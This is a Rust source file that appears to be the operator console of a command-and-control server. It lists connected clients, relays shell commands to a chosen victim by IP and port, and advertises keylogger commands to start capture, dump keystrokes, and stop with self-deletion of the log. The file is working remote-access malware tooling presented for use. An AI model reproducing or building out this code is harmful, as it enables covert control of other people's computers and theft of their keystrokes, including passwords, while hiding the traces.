use std::{io::{self, Write}, process};

use crate::config::ClientManager;

fn help() {
    let commands = r#"

List of available Commands:
----------------------------------------------------------------------------------------

help                           :    Shows available Commands

exit                           :    To terminate session

keylog_on                                       :    To start keylogger

keylog_dump                                     :    To print keystrokes

keylog_off                                      :    To close keylogger and self destruct the logged file

"#;

    println!("{}", commands);
}

fn shell(ip: String, server_client_manager: &ClientManager){
    println!("To exit the {} shell use 'exit' command", ip);
    let mut cmd = String::new();
    loop {
        let cmd_status: Option<String> = server_client_manager.get_command(&ip);

        // This waits for the command to be executed
        if cmd_status == None {
            println!("C2 {} => ", ip);
            io::stdout().flush().unwrap();

            cmd.clear();
            io::stdin().read_line(&mut cmd).unwrap();
            cmd = cmd.trim_end().to_owned();

            if cmd.is_empty() {
                continue
            }

            if cmd == "exit" {
                break
            }

            server_client_manager.update_command(&ip, cmd.clone());
        }
    }
}

pub fn commands(cmd: &String, server_client_manager: &ClientManager) {
    if cmd == "help" {
        help();
    }

    if cmd == "exit" {
        println!("Entered the command Exit");
        process::exit(0);
    }

    if cmd == "list-clients" || cmd == "lc" {
        let client_list: Vec<String> = server_client_manager.list_clients();
        println!("\nClients:");
        for client in client_list {
            println!("{}", client);
        }
    }

    if cmd == "shell" {
        println!("Which Client?(IP:PORT)");
        let mut ip = String::new();
        io::stdin().read_line(&mut ip).unwrap();
        ip = ip.trim_end().to_owned();

        if server_client_manager.client_exists(&ip) {
            shell(ip, server_client_manager);
        } else {
            println!("Client {} does not exists", &ip);
        }
    }
}

